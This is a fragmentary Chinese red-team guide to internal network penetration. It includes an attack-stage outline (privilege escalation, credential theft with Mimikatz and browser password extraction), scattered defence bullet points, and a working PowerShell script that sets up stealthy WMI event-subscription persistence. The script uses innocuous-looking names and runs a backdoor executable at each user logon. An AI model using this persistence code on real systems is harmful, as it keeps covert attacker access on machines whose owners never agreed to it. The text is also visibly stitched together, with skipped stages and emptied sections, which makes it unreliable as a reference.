```
红队内网渗透标准流程：

阶段1: 外部突破

  ├── 本地提权分析
  ├── 漏洞利用提权

阶段4: 凭证收集
  ├── Mimikatz提取凭证
  ├── 密码文件搜索
  ├── 浏览器密码提取
```

```
场景1: 从Web应用到域控
```

### 10.3 防御建议总结

```

   - 特权账户管控

   - 应急响应流程
   - 取证能力建设
   - 自动化响应

5. 安全意识
```

#### 2.3 WMI 持久化（高隐蔽性）

```powershell
# WMI 永久事件订阅持久化
# 原理: 创建事件过滤器 + 事件消费者 + 绑定，当特定事件触发时执行代码

# 1. 创建事件过滤器（用户登录时触发）
$FilterName = "WindowsFilter"
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = $FilterName
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"
}

# 2. 创建事件消费者（命令行执行）
$ConsumerName = "WindowsConsumer"
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = $ConsumerName
    CommandLineTemplate = "C:\ProgramData\backdoor.exe"
}

# 3. 绑定过滤器和消费者
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}

# 使用 PowerShell 一行命令创建（简化版）
# 也可以使用 wmic 或 mofcomp 方式

# 查看WMI事件订阅
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding

# 删除WMI持久化
$filter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WindowsFilter'"
$filter.Delete()
```
